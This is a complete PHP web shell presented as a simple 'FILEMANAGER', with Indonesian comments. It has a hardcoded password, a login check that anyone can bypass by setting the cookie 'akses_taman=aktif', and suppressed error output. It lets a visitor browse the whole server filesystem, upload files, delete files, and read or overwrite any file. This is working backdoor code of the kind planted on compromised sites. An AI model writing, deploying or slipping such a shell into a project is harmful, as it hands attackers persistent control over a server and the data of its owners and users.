<?php
/**
 * FAY - PHP 5 COMPATIBLE
 */
session_start();
error_reporting(0); // Mematikan error agar tidak merusak tampilan hitam

$kunci = "faya";
$c_name = "akses_taman";

// Fungsi Logout
if ($_GET['keluar']) {
    session_destroy();
    setcookie($c_name, "", time() - 3600);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Proses Login
if (isset($_POST['gembok']) && $_POST['gembok'] === $kunci) {
    $_SESSION[$c_name] = true;
    setcookie($c_name, "aktif", time() + 86400);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Cek Auth
if (!isset($_SESSION[$c_name]) && $_COOKIE[$c_name] !== "aktif") {
    echo "<body bgcolor=black text=white><center><br><br><h3>🔒 LOGIN</h3><form method='POST'><input type='password' name='gembok'><input type='submit' value='Masuk'></form></center></body>";
    exit;
}

// Penentuan Path (PHP 5 Style)
$root = str_replace('\\', '/', getcwd());
$peta = (isset($_GET['peta'])) ? base64_decode($_GET['peta']) : $root;
$peta = str_replace('\\', '/', $peta);

// Aksi Upload
if ($_POST['aksi'] == 'upload') {
    $target = $peta . '/' . $_FILES['muatan']['name'];
    if (move_uploaded_file($_FILES['muatan']['tmp_name'], $target)) {
        echo "<font color=lime>Upload Sukses!</font>";
    }
}

// Aksi Hapus
if ($_GET['aksi'] == 'hapus') {
    $target = base64_decode($_GET['target']);
    if (is_dir($target)) {
        rmdir($target);
    } else {
        unlink($target);
    }
    header("Location: ?peta=" . base64_encode($peta));
}

// Aksi Simpan Edit
if ($_POST['aksi'] == 'simpan') {
    $f_target = base64_decode($_POST['target']);
    $handle = fopen($f_target, "w");
    fwrite($handle, $_POST['konten']);
    fclose($handle);
    echo "<font color=lime>File Tersimpan!</font>";
}
?>
<html>
<head><title>FILEMANAGER - PHP5</title></head>
<body bgcolor="black" text="white" link="white" vlink="white" alink="red">
    <table width="100%" border="0">
        <tr>
            <td><h1>FILEMANAGER</h1></td>
            <td align="right"><a href="?keluar=1">[ Keluar ]</a></td>
        </tr>
    </table>
    <hr color="white">
    
    <font size="3">Path: </font>
    <?php
    $paths = explode('/', $peta);
    foreach ($paths as $id => $pat) {
        if ($pat == '' && $id == 0) {
            echo '<a href="?peta=' . base64_encode('/') . '">/</a>';
            continue;
        }
        if ($pat == '') continue;
        echo '<a href="?peta=' . base64_encode(implode('/', array_slice($paths, 0, $id + 1))) . '">' . $pat . '</a> / ';
    }
    ?>

    <br><br>
    <form method="POST" enctype="multipart/form-data">
        Upload: <input type="file" name="muatan">
        <input type="hidden" name="aksi" value="upload">
        <input type="submit" value="Upload">
    </form>
    <hr color="white">

    <?php if ($_GET['aksi'] == 'edit'): 
        $file_edit = base64_decode($_GET['target']);
        $konten = htmlspecialchars(file_get_contents($file_edit));
    ?>
        <h3>Edit: <?php echo basename($file_edit); ?></h3>
        <form method="POST">
            <textarea name="konten" rows="20" style="width:100%; background:black; color:white; border:1px solid white;"><?php echo $konten; ?></textarea><br><br>
            <input type="hidden" name="target" value="<?php echo $_GET['target']; ?>">
            <input type="hidden" name="aksi" value="simpan">
            <input type="submit" value="Simpan File"> 
            <a href="?peta=<?php echo base64_encode($peta); ?>">[ Kembali ]</a>
        </form>
    <?php else: ?>
        <table border="1" width="100%" cellpadding="5" cellspacing="0" bordercolor="white">
            <tr bgcolor="#222">
                <th>Nama</th>
                <th width="10%">Tipe</th>
                <th width="15%">Ukuran</th>
                <th width="15%">Aksi</th>
            </tr>
            <?php
            $items = scandir($peta);
            $folders = array();
            $files = array();

            foreach ($items as $item) {
                if ($item == "." || $item == "..") continue;
                if (is_dir($peta . '/' . $item)) {
                    $folders[] = $item;
                } else {
                    $files[] = $item;
                }
            }

            // Gabungkan Folder dulu baru File
            $sorted = array_merge($folders, $files);

            foreach ($sorted as $item) {
                $jalur = $peta . '/' . $item;
                $enc = base64_encode($jalur);
                $is_dir = is_dir($jalur);
                
                echo "<tr>";
                echo "<td>" . ($is_dir ? "<a href='?peta=$enc'><b>[ $item ]</b></a>" : $item) . "</td>";
                echo "<td align='center'>" . ($is_dir ? "DIR" : "FILE") . "</td>";
                echo "<td align='right'>" . ($is_dir ? "-" : filesize($jalur) . " B") . "</td>";
                echo "<td align='center'>";
                if (!$is_dir) {
                    echo "<a href='?peta=".base64_encode($peta)."&aksi=edit&target=$enc'>Edit</a> | ";
                }
                echo "<a href='?peta=".base64_encode($peta)."&aksi=hapus&target=$enc' onclick=\"return confirm('Hapus?')\">Hapus</a>";
                echo "</td></tr>";
            }
            ?>
        </table>
    <?php endif; ?>
    <hr color="white">
    <center><font size="2">&copy; <?php echo date("Y"); ?> FILEMANAGER (PHP5 Edition)</font></center>
</body>
</html>
